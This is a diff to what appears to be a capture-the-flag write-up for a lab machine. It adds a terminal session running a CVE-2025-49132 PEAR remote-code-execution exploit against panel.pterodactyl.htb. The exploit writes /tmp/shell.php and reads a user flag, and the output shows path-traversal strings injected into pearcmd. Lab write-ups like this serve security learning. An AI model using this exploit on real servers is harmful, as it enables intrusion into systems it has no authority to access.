@@ -468,3 +468,31 @@ headmonitor:x:1001:100::/home/headmonitor:/bin/bash
 phileasfogg3:x:1002:100::/home/phileasfogg3:/bin/bash
 ```
 
+```
+ajdev@rootbox:~/HTB/Pterodactyl$ python3 exploit.py --host panel.pterodactyl.htb --command "cat /home/phileasfogg3/user.txt"
+
+╔═══════════════════════════════════════════════════════════╗
+║           CVE-2025-49132 PEAR RCE Exploit                ║
+║           Target: panel.pterodactyl.htb                       ║
+╚═══════════════════════════════════════════════════════════╝
+
+[*] Target: http://panel.pterodactyl.htb
+[*] PEAR Path: ../../../../../../usr/share/php/PEAR
+[*] Command: cat /home/phileasfogg3/user.txt
+
+[*] Writing payload to /tmp/shell.php...
+[+] Payload written
+[*] Executing payload...
+[+] Command executed successfully!
+
+============================================================
+OUTPUT:
+============================================================
+#PEAR_Config 0.9
+a:13:{s:7:"php_dir";s:125:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/0325f6b328e75c300ea1c9ac3a0dc6ab
+0325f6b328e75c300ea1c9ac3a0dc6ab/pear/php";s:8:"data_dir";s:126:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/0325f6b328e75c300ea1c9ac3a0dc6ab
+0325f6b328e75c300ea1c9ac3a0dc6ab/pear/data";s:7:"www_dir";s:125:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/0325f6b328e75c300ea1c9ac3a0dc6ab
+0325f6b328e75c300ea1c9ac3a0dc6ab
+============================================================
+```
+
